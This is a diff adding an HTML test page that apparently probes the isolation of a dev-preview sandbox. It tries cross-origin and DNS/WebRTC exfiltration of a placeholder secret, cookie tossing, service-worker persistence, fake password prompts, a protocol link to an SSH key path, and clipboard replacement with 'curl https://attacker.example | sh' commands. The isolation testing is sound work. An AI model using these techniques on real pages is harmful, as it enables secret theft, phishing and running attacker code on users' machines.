@@ -1,0 +1,92 @@
+<!doctype html><meta charset=utf-8><title>dev preview</title>
+<h1>Your app</h1>
+<p id=cmd>curl -s https://attacker.example/x | sh</p>
+<button id=clip>copy</button>
+<a id=proto href="vscode://file/Users/you/.ssh/id_ed25519">open in editor</a>
+<script>
+// One test per load, named by ?t=. Each reports what it saw to the computer's own server (/ok),
+// which is the only place the page may reach.
+const S = "{{SECRET}}", SN = S.replace(/-/g, "").toLowerCase();
+const C2 = location.origin.replace("c1a7", "c2b9");
+const A = "http://127.0.0.1:4000/hit?d=" + S + "&via=";
+const OK = (w, d) => fetch("/ok?what=" + w + "&d=" + encodeURIComponent(d === undefined ? "" : String(d))).catch(() => {});
+const T = (name, f) => { try { const r = f(); if (r && r.catch) r.catch(e => OK(name, "error: " + e.name)); } catch (e) { OK(name, "error: " + e.name + ": " + e.message); } };
+const t = new URLSearchParams(location.search).get("t");
+
+const TESTS = {
+  // Another computer's preview, from this one's page.
+  cross() {
+    T("cross-fetch", () => fetch(C2 + "/from-c1?via=fetch&d=" + S, {mode: "no-cors", credentials: "include"}).then(() => OK("cross-fetch", "sent")));
+    T("cross-cors-read", () => fetch(C2 + "/from-c1?via=cors-read&d=" + S).then(r => r.text()).then(x => OK("cross-cors-read", "read: " + x.slice(0, 40))));
+    T("cross-img", () => { new Image().src = C2 + "/from-c1?via=img&d=" + S; });
+    T("cross-beacon", () => navigator.sendBeacon(C2 + "/from-c1?via=beacon", S));
+    T("cross-ws", () => { new WebSocket(C2.replace("http", "ws") + "/from-c1?via=ws&d=" + S); });
+    T("cross-iframe", () => { const i = document.createElement("iframe"); i.src = C2 + "/from-c1?via=iframe&d=" + S; document.body.appendChild(i); });
+    T("cross-bc", () => { new BroadcastChannel("silo").postMessage(S); });
+  },
+  // The app's own sign-in cookie, set with the browser's default SameSite, inside Silo's page.
+  login() {
+    fetch("/login").then(() => fetch("/ok?what=login-cookie-sent-back")).then(() => OK("login", document.cookie));
+  },
+  // Cookies that another computer's previews would receive.
+  toss() {
+    for (const d of ["silo.localhost", "localhost", ".silo.localhost", location.hostname.split(".").slice(1).join(".")]) {
+      document.cookie = `js_${d.replace(/\W/g, "_")}=${S}; domain=${d}; path=/`;
+    }
+    fetch("/set-cookie").then(() => OK("toss", document.cookie));
+  },
+  // State that outlives the page, in the browser that shows it.
+  sw() {
+    localStorage.setItem("planted", S);
+    T("sw", () => navigator.serviceWorker.register("/sw.js").then(r => OK("sw", "registered " + r.scope)));
+  },
+  probe() {
+    OK("probe", "localStorage=" + localStorage.getItem("planted") + " controlled=" + !!(navigator.serviceWorker && navigator.serviceWorker.controller) + " cookie=" + document.cookie);
+  },
+  // Names that carry the secret. A lookup of the name is enough to send it.
+  dns() {
+    const N = v => `${v}-${SN}.exfil.test`;
+    for (const rel of ["dns-prefetch", "preconnect"]) {
+      const l = document.createElement("link"); l.rel = rel; l.href = "http://" + N(rel) + "/"; document.head.appendChild(l);
+    }
+    T("dns-img", () => { new Image().src = "http://" + N("img") + "/x.png"; });
+    T("dns-fetch", () => fetch("http://" + N("fetch") + "/", {mode: "no-cors"}).catch(() => {}));
+    T("dns-ws", () => { new WebSocket("ws://" + N("ws") + "/"); });
+    T("dns-webrtc", async () => {
+      const pc = new RTCPeerConnection({iceServers: [{urls: "stun:" + N("stun") + ":3478"}, {urls: "turn:" + N("turn") + ":3478?transport=udp", username: "u", credential: "x"}, {urls: "turn:" + N("turntcp") + ":3478?transport=tcp", username: "u", credential: "x"}]});
+      pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer());
+      pc.onicecandidate = e => { if (e.candidate) OK("dns-webrtc-candidate", e.candidate.candidate); };
+    });
+    T("webrtc-ip", async () => {
+      const pc = new RTCPeerConnection({iceServers: [{urls: "stun:127.0.0.1:4001"}, {urls: "turn:127.0.0.1:4001?transport=udp", username: S, credential: "x"}]});
+      pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer());
+    });
+  },
+  // Things drawn by the browser, over Silo's page.
+  modal() {
+    T("prompt", () => OK("prompt", "returned " + JSON.stringify(prompt("Silo: enter your Mac password to keep going"))));
+    T("confirm", () => OK("confirm", "returned " + confirm("Silo: allow this computer to reach your network?")));
+  },
+  notify() {
+    T("notification", () => Notification.requestPermission().then(p => OK("notification", p)));
+    T("print", () => { window.print(); OK("print", "called"); });
+    T("fullscreen", () => document.documentElement.requestFullscreen().then(() => OK("fullscreen", "entered")));
+  },
+  // Other programs on the Mac, through a link's scheme.
+  proto() {
+    T("proto-self", () => { location.href = "vscode://file/Users/you/.ssh/id_ed25519"; });
+    setTimeout(() => OK("proto-self", "still here"), 800);
+  },
+  // The clipboard, a channel to the Mac of its own.
+  clip() {
+    document.getElementById("clip").onclick = () => {
+      const r = document.createRange(); r.selectNode(document.getElementById("cmd"));
+      getSelection().removeAllRanges(); getSelection().addRange(r);
+      T("clip-exec", () => OK("clip-exec", "execCommand=" + document.execCommand("copy")));
+      T("clip-api", () => navigator.clipboard.writeText("curl -s https://attacker.example/y | sh").then(() => OK("clip-api", "written")));
+    };
+    document.addEventListener("copy", e => { e.clipboardData.setData("text/plain", "curl -s https://attacker.example/z | sh"); e.preventDefault(); OK("clip-event", "replaced"); });
+  },
+};
+if (TESTS[t]) TESTS[t]();
+</script>
